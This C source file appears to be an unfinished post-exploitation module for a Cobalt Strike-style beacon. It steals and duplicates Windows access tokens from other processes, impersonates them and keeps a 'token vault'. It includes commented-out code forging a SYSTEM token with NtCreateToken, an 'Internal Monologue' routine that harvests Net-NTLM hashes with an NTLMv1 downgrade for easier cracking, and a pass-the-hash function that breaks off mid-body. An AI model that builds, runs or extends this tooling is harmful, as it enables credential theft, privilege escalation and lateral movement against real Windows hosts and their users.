#include <Token.h>
#include "ntlm.c"

/*
 * todo:
 * 	create: create token using NtCreateToken (need SeCreateTokenPrivilege, steal it from lsass) and add it to the vault
 * 	remove: remove tokens from the vault
 * 	make: create a token using creds and put in the vault
 * 	steal: steal a token and place in the vault
 * 		- use duplication (NtDuplicateToken) to duplicate it and have impersonation/primary token
 * 		- might also use duplication to change the Impersonation Level
 * 		- Impersonation Level ignored on primary tokens ???
 * 	getuid: get the username of a token
 * 	info: get token information
 * 	impersonate: have an option to impersonate anonymous using NtImpersonateAnonymousToken
 * 		- thread impersonation -> need Impersonate access on the token, use NtSetInformationThread with ThreadImpersonationToken class
 * 		- you can impersonate a thread if you have the "Direct Impersonation" access, use NtImpersonateThread
 * 	set: change the information of a token -> enable/disable groups/privileges
 * 		- NtAdjustGroupsToken, NtAdujstPrivilegesToken (can also be used to remove a priv)
 * 	change integrity level?? SeTcpPrivilege is required for increasing -> Might then use with the func that can send callbacks to window to privesc
 * 	to decrease the integrity level nothing is required
 * 
 *  look into device groups, it's like groups for remote resources when it auths. Could have things like DOMAIN/COMPUTER1$
 *  privileges luid are small numbers so might be the same accross systems, resolve manually?
 * 
 * SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege -> bypass assigning token checking, but be enabled on process primary token, not impersonation token
 * can not change the primary token on a running process using NtSetInformationProcess, do it a suspended process maybe??
 */

VOID TokenLookupPrivilege(
	IN PLUID  Luid,
	OUT PCHAR PrivName
) {
	if ( Luid->HighPart == 0 && Luid->LowPart == 2 ) MSVCRT$strcpy( PrivName, "SeCreateTokenPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 3 ) MSVCRT$strcpy( PrivName, "SeAssignPrimaryToken\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 4 ) MSVCRT$strcpy( PrivName, "SeLockMemoryPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 5 ) MSVCRT$strcpy( PrivName, "SeIncreaseQuotaPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 6 ) MSVCRT$strcpy( PrivName, "SeMachineAccountPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 7 ) MSVCRT$strcpy( PrivName, "SeTcbPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 8 ) MSVCRT$strcpy( PrivName, "SeSecurityPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 9 ) MSVCRT$strcpy( PrivName, "SeTakeOwnershipPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 10 ) MSVCRT$strcpy( PrivName, "SeLoadDriverPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 11 ) MSVCRT$strcpy( PrivName, "SeSystemProfilePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 12 ) MSVCRT$strcpy( PrivName, "SeSystemTimePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 13 ) MSVCRT$strcpy( PrivName, "SeProfSingleProcessPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 13 ) MSVCRT$strcpy( PrivName, "SeIncBasePriorityPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 14 ) MSVCRT$strcpy( PrivName, "SeIncBasePriorityPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 15 ) MSVCRT$strcpy( PrivName, "SeCreatePageFilePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 16 ) MSVCRT$strcpy( PrivName, "SeCreatePermanentPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 17 ) MSVCRT$strcpy( PrivName, "SeBackupPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 18 ) MSVCRT$strcpy( PrivName, "SeRestorePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 19 ) MSVCRT$strcpy( PrivName, "SeShutdownPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 20 ) MSVCRT$strcpy( PrivName, "SeDebugPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 21 ) MSVCRT$strcpy( PrivName, "SeAuditPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 22 ) MSVCRT$strcpy( PrivName, "SeSystemEnvironmentPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 23 ) MSVCRT$strcpy( PrivName, "SeChangeNotifyPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 24 ) MSVCRT$strcpy( PrivName, "SeRemoteShutdownPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 25 ) MSVCRT$strcpy( PrivName, "SeUndockPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 26 ) MSVCRT$strcpy( PrivName, "SeSyncAgentPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 27 ) MSVCRT$strcpy( PrivName, "SeEnableDelegationPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 28 ) MSVCRT$strcpy( PrivName, "SeManageVolumePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 29 ) MSVCRT$strcpy( PrivName, "SeImpersonatePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 30 ) MSVCRT$strcpy( PrivName, "SeCreateGlobalPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 31 )
		MSVCRT$strcpy( PrivName, "SeTrustedCredmanAccessPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 32 ) MSVCRT$strcpy( PrivName, "SeRelabelPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 33L ) MSVCRT$strcpy( PrivName, "SeIncWorkingSetPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 34 ) MSVCRT$strcpy( PrivName, "SeTimeZonePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 35 ) MSVCRT$strcpy( PrivName, "SeCreateSymbolicLinkPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 36 )
		MSVCRT$strcpy( PrivName, "SeDelegationSessionUserImpersonatePrivilege\0" );
}

NTSTATUS TokenAddVault(
	IN HANDLE         token,
	IN OPTIONAL ULONG pidStolen,
	IN OPTIONAL PWSTR username,
	IN OPTIONAL PWSTR domain,
	IN OPTIONAL PWSTR password
) {
	NTSTATUS                    status         = { 0 };
	ULONG                       usernameLen    = { 0 };
	ULONG                       domainLen      = { 0 };
	ULONG                       userSize       = { 0 };
	ULONG                       elevation      = { 0 };
	ULONG                       size           = { 0 };
	ULONG                       tokenType      = { 0 };
	PTOKEN_USER                 userInfo       = { 0 };
	SID_NAME_USE                SidType        = { 0 };
	OBJECT_ATTRIBUTES           ObjAttr        = { 0 };
	SECURITY_QUALITY_OF_SERVICE Sqos           = { 0 };
	PTOKEN_VAULT                tokenVault     = { 0 };
	PTOKEN_ENTRY                tokenLoopEntry = { 0 };

	PTOKEN_ENTRY tokenEntry = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_ENTRY ) );

	// set the username and domain
	if ( ! domain || ! username ) {
		// query the user of the token
		if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( token, TokenUser, userInfo, 0, &userSize ) ) ) {
			userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, userSize );

			// get the sid
			if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
				token,
				TokenUser,
				userInfo,
				userSize,
				&userSize
			) ) ) {
				PRINT_NT_ERROR( "NtQueryInformationToken", status );
				return status;
			}

			// convert the sid
			if ( ! ADVAPI32$LookupAccountSidW( NULL, userInfo->User.Sid, NULL, &usernameLen, NULL, &domainLen,
			                                   &SidType ) ) {
				// allocate memory for user and domain
				tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, usernameLen );
				tokenEntry->Domain   = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, domainLen );

				// convert the sid to a username and domain
				if ( ! ADVAPI32$LookupAccountSidW(
					NULL,
					userInfo->User.Sid,
					tokenEntry->Username,
					&usernameLen,
					tokenEntry->Domain,
					&domainLen,
					&SidType
				) ) {
					PRINT_WIN32_ERROR( "LookupAccountSidA" );
					return STATUS_INTERNAL_ERROR;
				}
			}
		}
	} else {
		// set the domain
		domainLen          = MSVCRT$wcslen( domain );
		tokenEntry->Domain = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, domainLen * 2 );
		MemCopy( tokenEntry->Domain, domain, domainLen * 2 );

		// set the username
		usernameLen          = MSVCRT$wcslen( username );
		tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, usernameLen * 2 );
		MemCopy( tokenEntry->Username, username, usernameLen * 2 );
	}

	// set the password
	tokenEntry->Password  = password;
	tokenEntry->PidStolen = pidStolen;

	// get the elevation level
	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
		token,
		TokenElevation,
		&elevation,
		sizeof(elevation),
		&size
	) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	// set the elevation level
	tokenEntry->Elevated = elevation;

	// duplicate the token to have both an impersonate and primary token
	// query what type is it first
	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
		token,
		TokenType,
		&tokenType,
		sizeof( tokenType ),
		&size
	) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	if ( tokenType == 1 ) {
		// it is a primay token
		tokenEntry->PrimaryToken = token;
	} else {
		// it is an impersonation token
		tokenEntry->ImpersonationToken = token;
	}

	// duplicate the token
	Sqos.Length              = sizeof( SECURITY_QUALITY_OF_SERVICE );
	Sqos.ImpersonationLevel  = SecurityImpersonation;
	Sqos.ContextTrackingMode = 0;
	Sqos.EffectiveOnly       = FALSE;

	InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, 0 );
	ObjAttr.SecurityQualityOfService = &Sqos;

	if ( ! NT_SUCCESS( status = NTDLL$NtDuplicateToken(
		token,
		TOKEN_ALL_ACCESS,
		NULL,
		FALSE,
		( tokenType == 1 ) ? TokenImpersonation : TokenPrimary,
		( tokenType == 1 ) ? &tokenEntry->ImpersonationToken : &tokenEntry->PrimaryToken
	) ) ) {
		PRINT_NT_ERROR( "NtDuplicateToken", status );
		goto END;
	}

	// get the token vault
	/*
	tokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
	if ( ! tokenVault ) {
		// the token vault does not exist
		// lets create it
		tokenVault = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_VAULT ) );

		// add it to the beacon memory
		BeaconAddValue( TOKEN_VAULT_KEY, tokenVault );
	}

	if ( tokenVault->NbEntry == 0 ) {
		tokenEntry->Id = tokenVault->LastId = 1;
		tokenVault->First = tokenEntry;
	} else {
		tokenLoopEntry = tokenVault->First;

		for ( int i = 0 ; i < tokenVault->NbEntry - 1 ; i++ ) {
			tokenLoopEntry = tokenLoopEntry->Next;
		}

		tokenEntry->Id = ++tokenVault->LastId;
		tokenLoopEntry->Next = tokenEntry;
	}

	tokenVault->NbEntry++;
	*/

END:
	if ( userInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userInfo );
	return status;
}

/*!
 * @brief
 * 	query token information using NtQueryInformationToken
 *
 * @param Token
 * 	token to query the information of
 *
 * @return
 * 	ntstatus
 */
NTSTATUS TokenInfo(
	IN HANDLE Token
) {
	/* interesting information to query
	 * Username + SID
	 * Privileges (Enabled/Disabled)
	 * Groups (Enabled/Disabled) + SID
	 * Impersonation Level -> whether you can impersonate the token
	 * Integrity Level
	 * GrantAccess: AssignPrimary, Duplicate, Impersonate...
	 * Elevated (just means has one of the following privs and so high privs) if it matches a certain RID, considered Elevated too
	 * 	- SeCreateTokenPrivilege, SeTcpPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeDelegationSessionUserImpersonatePrivilege
	 * Some privileged like SeDebugPrivilege can not be enabled on non-high integrity level processes
	 * TODO: RELEASE THE MEMORY
	 */

	NTSTATUS                     status                  = { 0 };
	PTOKEN_USER                  UserInfo                = { 0 };
	ULONG                        size                    = { 0 };
	PCHAR                        username                = { 0 };
	DWORD                        UserLen                 = { 0 };
	DWORD                        DomainLen               = { 0 };
	SID_NAME_USE                 SidType                 = { 0 };
	PTOKEN_GROUPS_AND_PRIVILEGES GroupsAndPrivilegesInfo = { 0 };
	CHAR                         PrivName[ MAX_PATH ]    = { 0 };
	PLUID_AND_ATTRIBUTES         Priv                    = { 0 };
	PSID_AND_ATTRIBUTES          Group                   = { 0 };
	UNICODE_STRING               SidSddl                 = { 0 };
	PTOKEN_ACCESS_INFORMATION    accessInfo              = { 0 };
	ULONG                        elevation               = { 0 };
	ULONG                        type                    = { 0 };

	// query the user of the token
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenUser, UserInfo, 0, &size ) ) ) {
		UserInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );

		// get the sid
		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
			Token,
			TokenUser,
			UserInfo,
			size,
			&size
		) ) ) {
			PRINT_NT_ERROR( "NtQueryInformationToken", status );
			return status;
		}

		// convert the sid
		if ( ! ADVAPI32$LookupAccountSidA( NULL, UserInfo->User.Sid, NULL, &UserLen, NULL, &DomainLen,
		                                   &SidType ) ) {
			// allocate memory for user and domain
			username = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, UserLen + DomainLen );

			// convert the sid to a username and domain
			if ( ! ADVAPI32$LookupAccountSidA(
				NULL,
				UserInfo->User.Sid,
				username + DomainLen,
				&UserLen,
				username,
				&DomainLen,
				&SidType
			) ) {
				PRINT_WIN32_ERROR( "LookupAccountSidA" );
				return STATUS_INTERNAL_ERROR;
			}

			username[ DomainLen ] = '\\';
		}

		// get the sid as SDDL
		if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( &SidSddl, UserInfo->User.Sid, TRUE ) ) ) {
			PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", status );
			return status;
		}

		PRINTF( "%s - %ls\n", username, SidSddl.Buffer );

		// free the sddl sid
		NTDLL$RtlFreeUnicodeString( &SidSddl );
	}

	// query group and privileges
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken(
		Token,
		TokenGroupsAndPrivileges,
		GroupsAndPrivilegesInfo,
		0,
		&size
	) ) ) {
		// allocate memory for the groups and privileges
		GroupsAndPrivilegesInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );

		// get the sid
		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
			Token,
			TokenGroupsAndPrivileges,
			GroupsAndPrivilegesInfo,
			size,
			&size
		) ) ) {
			PRINT_NT_ERROR( "NtQueryInformationToken", status );
			return status;
		}

		// loop through privileges
		for ( int PrivCnt = 0 ; PrivCnt < GroupsAndPrivilegesInfo->PrivilegeCount ; PrivCnt++ ) {
			Priv = &GroupsAndPrivilegesInfo->Privileges[ PrivCnt ];

			TokenLookupPrivilege( &Priv->Luid, PrivName );

			PRINTF( "%s : %s\n", PrivName, (Priv->Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled" );
		}

		for ( int SidCnt = 0 ; SidCnt < GroupsAndPrivilegesInfo->SidCount ; SidCnt++ ) {
			Group = &GroupsAndPrivilegesInfo->Sids[ SidCnt ];

			// get the sid as SDDL
			if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, Group->Sid, TRUE ) ) ) {
				PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", status );
				goto END;
			}

			//PRINTF( "Group: %ls\n", SidSddl.Buffer );
			NTDLL$RtlFreeUnicodeString( &SidSddl );
		}
	}

	// query elevation
	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
		Token,
		TokenElevation,
		&elevation,
		sizeof(elevation),
		&size
	) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	PRINTF( "Elevated : %s\n", (elevation == 0) ? "False" : "True" );

	// query type
	if ( ! NT_SUCCESS(
		status = NTDLL$NtQueryInformationToken( Token, TokenType, &type, sizeof( type ), &size ) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", status );
		goto END;
	}

	PRINTF( "Type: %s\n", (type == 1) ? "Primary" : "Impersonation" );

	// query impersonation level
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenAccessInformation, NULL, 0, &size ) ) ) {
		accessInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
		NTDLL$NtQueryInformationToken( Token, TokenAccessInformation, accessInfo, size, &size );

		switch ( accessInfo->ImpersonationLevel ) {
			case 0 :
				PRINTF( "Impersonation level: anonymous\n" );
				break;
			case 1 :
				PRINTF( "Impersonation level: identification\n" );
				break;
			case 2 :
				PRINTF( "Impersonation level: impersonation\n" );
				break;
			case 3 :
				PRINTF( "Impersonation level: delegation\n" );
				break;
			default :
				PRINTF( "Impersonation level: unknown\n" );
		}
	}

END:
	if ( UserInfo ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, UserInfo );
	if ( username ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, username );
	if ( GroupsAndPrivilegesInfo ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, GroupsAndPrivilegesInfo );
	if ( accessInfo ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, accessInfo );
	return status;
}

/*!
 * @brief
 * 	steal the token of a process with the DUPLICATE access mask
 *
 * @param pid
 * 	pid of the process to steal the token
 *
 * @return
 * 	token of the process
 */
NTSTATUS TokenSteal(
	IN ULONG Pid
) {
	NTSTATUS          Status   = { 0 };
	HANDLE            Proc     = { 0 };
	HANDLE            Token    = { 0 };
	OBJECT_ATTRIBUTES Attr     = { 0 };
	CLIENT_ID         ClientId = { 0 };

	ClientId.UniqueProcess = Pid;

	if ( ! NT_SUCCESS( Status = NTDLL$NtOpenProcess(
		&Proc,
		PROCESS_QUERY_LIMITED_INFORMATION,
		&Attr,
		&ClientId
	) ) ) {
		PRINT_NT_ERROR( "NtOpenProcess", Status );
		goto END;
	}

	// TODO: is the token still valid if the process where it is stolen from does not exist anymore, look into that
	// query the token of that process
	if ( ! NT_SUCCESS( Status = NTDLL$NtOpenProcessTokenEx(
		Proc,
		TOKEN_DUPLICATE | TOKEN_QUERY,
		0,
		&Token
	) ) ) {
		PRINT_NT_ERROR( "NtOpenProcessTokenEx", Status );
		goto END;
	}

	// store the token
	/*
	if ( ! NT_SUCCESS( TokenAddVault( Token, Pid, NULL, NULL, NULL ) ) ) {
		PRINTF( "[!] Failed to add the token to the vault\n" );
		goto END;
	}
	*/

	// print the token
	PRINTF( "[+] Successfully stole token of process with id %ld: 0x%08X\n", Pid, Token )

END:
	// free the process buffer
	NTDLL$NtClose( Proc );
	return Status;
}

NTSTATUS TokenImpersonate(
	IN USHORT Id
) {
	NTSTATUS     Status     = { 0 };
	PTOKEN_ENTRY TokenEntry = { 0 };
	PTOKEN_VAULT TokenVault = { 0 };

	// get the token vault
	TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );

	if ( TokenVault && TokenVault->NbEntry ) {
		TokenEntry = TokenVault->First;

		// search for the token with that id
		for ( USHORT i = 0 ; i < TokenVault->NbEntry - 1 ; i++ ) {
			if ( TokenEntry->Id == Id ) {
				// set this token as the current one
				TokenVault->Current = TokenEntry;

				// impersonate the token
				if ( ! NT_SUCCESS( Status = NTDLL$NtSetInformationThread(
					NtCurrentThread(),
					ThreadImpersonationToken,
					&TokenEntry->ImpersonationToken,
					sizeof( TokenEntry->ImpersonationToken )
				) ) ) {
					PRINT_NT_ERROR( "NtSetInformationThread", Status );
					return Status;
				}

				break;
			}

			TokenEntry = TokenEntry->Next;
		}
	} else {
		PRINTF( "Can't impersonate token with id %u, the token vault is empty!", Id );
		return STATUS_INTERNAL_ERROR;
	}

	return Status;
}

VOID TokenRev2Self() {
	NTSTATUS     Status     = { 0 };
	HANDLE       Token      = { 0 };
	PTOKEN_VAULT TokenVault = { 0 };

	// get the token vault
	TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );

	if ( TokenVault ) {
		// clear the current token
		TokenVault->Current = NULL;

		// stop impersonating that token in the current thread
		if ( ! NT_SUCCESS( Status = NTDLL$NtSetInformationThread(
			NtCurrentThread(),
			ThreadImpersonationToken,
			&Token,
			sizeof( Token )
		) ) ) {
			PRINT_NT_ERROR( "NtSetInformationThread", Status );
		}
	}
}

/*
VOID TokenCreate() {
	NTSTATUS                    Status           = { 0 };
	HANDLE                      Token            = { 0 };
	OBJECT_ATTRIBUTES           ObjAttr          = { 0 };
	SECURITY_QUALITY_OF_SERVICE Sqos             = { 0 };
	LARGE_INTEGER               ExpTime          = { 0 };
	DWORD                       SidSize          = { 0 };
	SID_IDENTIFIER_AUTHORITY    AuthoritySid     = SECURITY_MANDATORY_LABEL_AUTHORITY;
	TOKEN_GROUPS_MULTI          Groups           = { 0 };
	TOKEN_PRIVILEGES_MULTI      Privs            = { 0 };
	TOKEN_PRIMARY_GROUP         PrimaryGroup     = { 0 };
	TOKEN_USER                  User             = { 0 };
	LUID                        AuthenticationId = { .HighPart = 0, .LowPart = 999 };
	TOKEN_SOURCE                Source           = { "Ch11", 777 };

	// initialize the attributes
	Sqos.Length              = sizeof( SECURITY_QUALITY_OF_SERVICE );
	Sqos.ImpersonationLevel  = SecurityImpersonation;
	Sqos.ContextTrackingMode = 0;
	Sqos.EffectiveOnly       = FALSE;

	InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, 0 );
	ObjAttr.SecurityQualityOfService = &Sqos;

	// allocate 6 groups
	Groups.GroupCount = 6;
	Groups.Groups     = KERNEL32$LocalAlloc( LPTR, Groups.GroupCount * sizeof( SID_AND_ATTRIBUTES ) );

	// initialize the group sids
	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinBuiltinAdministratorsSid, NULL, &Groups.Groups[ 0 ].Sid, &SidSize );
	Groups.Groups[ 0 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED | SE_GROUP_OWNER;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinWorldSid, NULL, &Groups.Groups[ 1 ].Sid, &SidSize );
	Groups.Groups[ 1 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinInteractiveSid, NULL, &Groups.Groups[ 2 ].Sid, &SidSize );
	Groups.Groups[ 2 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinLocalSystemSid, NULL, &Groups.Groups[ 3 ].Sid, &SidSize );
	Groups.Groups[ 3 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	if ( ! NT_SUCCESS( Status = NTDLL$RtlAllocateAndInitializeSid(
		&AuthoritySid,
		1,
		SECURITY_MANDATORY_MEDIUM_RID,
		0, 0, 0, 0, 0, 0, 0,
		&Groups.Groups[ 4 ].Sid
	) ) ) {
		PRINT_NT_ERROR( "RtlAllocateAndInitializeSid", Status );
	}
	Groups.Groups[ 4 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinAuthenticatedUserSid, NULL, &Groups.Groups[ 5 ].Sid, &SidSize );
	Groups.Groups[ 5 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	// initialize the privileges
	Privs.PrivilegeCount = 2;
	Privs.Privileges     = KERNEL32$LocalAlloc( LPTR, Privs.PrivilegeCount * sizeof( SID_AND_ATTRIBUTES ) );

	Privs.Privileges[ 0 ].Attributes   = SE_PRIVILEGE_ENABLED_BY_DEFAULT;
	Privs.Privileges[ 0 ].Luid.LowPart = SE_CHANGE_NOTIFY_PRIVILEGE;
	Privs.Privileges[ 1 ].Luid.LowPart = SE_TCB_PRIVILEGE;

	// initialize primary group
	// does not really matter, for POSIX compability
	PrimaryGroup.PrimaryGroup = &Groups.Groups[ 0 ].Sid;

	// the user
	User.User.Sid = &Groups.Groups[ 3 ].Sid;

	if ( ! NT_SUCCESS( Status = NTDLL$NtCreateToken(
		&Token,
		TOKEN_ALL_ACCESS,
		&ObjAttr,
		TokenImpersonation,
		&AuthenticationId, // TODO: Enumerate logon sessions using LsaEnumerateLogonSessions
		&ExpTime,
		&User,                         // TOKEN_USER struct
		( PTOKEN_GROUPS ) & Groups,    // TOKEN_GROUP struct
		( PTOKEN_PRIVILEGES ) & Privs, // Privilege
		NULL,                          // TOKEN_OWNER struct
		&PrimaryGroup,                 // Primary group, one of the group in TOKEN_GROUP
		NULL,
		&Source // Token source
	) ) ) {
		PRINT_NT_ERROR( "NtCreateToken", Status );
	} else {
		internal_printf( "Successfully created token!" );
	}
}
*/

/*!
 * @brief
 *	the a Net-NTLM hash for the current user
 *	you just have to impersonate that a token of that user before
 *	impersonating token in the current thread can be done using the TokenImpersonate function
 *	LSA has to have the user creds cached in memory, otherwise it wont work
 *	the idea is not mine, it's the one of Elad Shamir, all credits go to him
 *	you can find its project for that here: https://github.com/eladshamir/Internal-Monologue
 *
 * @param netNtlmv1
 *	change a few registry keys to allow Net-NTLMv1 authentication and get a hash that is a lot easier to crack
 *
 * @return
 */
NTSTATUS TokenInternalMonologue(
	IN BOOL netNtlmv1
) {
	NTSTATUS       status            = { 0 };
	SecBuffer      negotiateToken    = { 0 };
	SecBuffer      challengeToken    = { 0 };
	SecBuffer      authenticateToken = { 0 };
	CtxtHandle     clientCtx         = { 0 };
	CtxtHandle     clientCreds       = { 0 };
	CtxtHandle     serverCtx         = { 0 };
	CtxtHandle     serverCreds       = { 0 };
	UNICODE_STRING username          = INIT_UNICODE_STRING( L"hola" );
	UNICODE_STRING domain            = INIT_UNICODE_STRING( L"WORKGROUP" );

	/*
	 * get a negotiate token
	 * if no arbitrary creds are supplied it will do local authentication instead
	 * when doing local authentication the server sets the reserved member
	 * and when the reserved member is set, LSA on the client side set an empty LM & NT response
	 * if the LM & NT response are empty there won't be any hash to crack, could maybe crack the mic but i prefer
	 * cracking the challenge response anyway
	 * used dummy credentials to avoid local authentication
	 * theorically could also patch the reserved member of the challenge token but can't make it work
	 */
	if ( ! NT_SUCCESS( status = ClientCreateNegotiateToken(
		&username,
		&domain,
		&negotiateToken,
		&clientCtx,
		&clientCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the negotiate token\n" );
		goto END;
	}

	// get a challenge token
	if ( ! NT_SUCCESS( status = ServerCreateChallengeToken(
		&negotiateToken,
		&challengeToken,
		&serverCtx,
		&serverCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the challenge token\n" );
		goto END;
	}

	// get an authenticate token
	if ( ! NT_SUCCESS( status = ClientCreateAuthenticateToken(
		NULL,
		NULL,
		NULL,
		NULL,
		&challengeToken,
		&clientCtx,
		&clientCreds,
		&authenticateToken
	) ) ) {
		PRINTF( "[!] Failed to generate the authenticate token\n" );
		goto END;
	}

	// set to hashcat format
	// user::domain:serverchallenge:ntProofStr:ntlmv2ClientChallenge

END:
	if ( negotiateToken.pvBuffer ) SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
	if ( challengeToken.pvBuffer ) SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
	if ( authenticateToken.pvBuffer ) SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );
	return status;
}

NTSTATUS TokenMakePth(
	IN PUNICODE_STRING username,
	IN PUNICODE_STRING domain,
	IN PBYTE           passwordHash
) {
	NTSTATUS   status            = { 0 };
	SecBuffer  negotiateToken    = { 0 };
	CtxtHandle clientCtx         = { 0 };
	CredHandle clientCreds       = { 0 };
	SecBuffer  challengeToken    = { 0 };
	CtxtHandle serverCtx         = { 0 };
	CredHandle serverCreds       = { 0 };
	SecBuffer  authenticateToken = { 0 };
	HANDLE     accessToken       = { 0 };

	// get a negotiate token
	if ( ! NT_SUCCESS( status = ClientCreateNegotiateToken(
		username,
		domain,
		&negotiateToken,
		&clientCtx,
		&clientCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the negotiate token\n" );
		goto END;
	}

	// get a challenge token
	if ( ! NT_SUCCESS( status = ServerCreateChallengeToken(
		&negotiateToken,
		&challengeToken,
		&serverCtx,
		&serverCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the challenge token\n" );
		goto END;
	}

	// get an authenticate token
	if ( ! NT_SUCCESS( status = ClientCreateAuthenticateToken(
		username,
		domain,
		passwordHash,
		&negotiateToken,
		&challengeToken,
		&clientCtx,
		&clientCreds,
		&authenticateToken
	) ) ) {
		PRINTF( "[!] Failed to generate the authenticate token\n" );
		goto END;
	}

	// get an access token
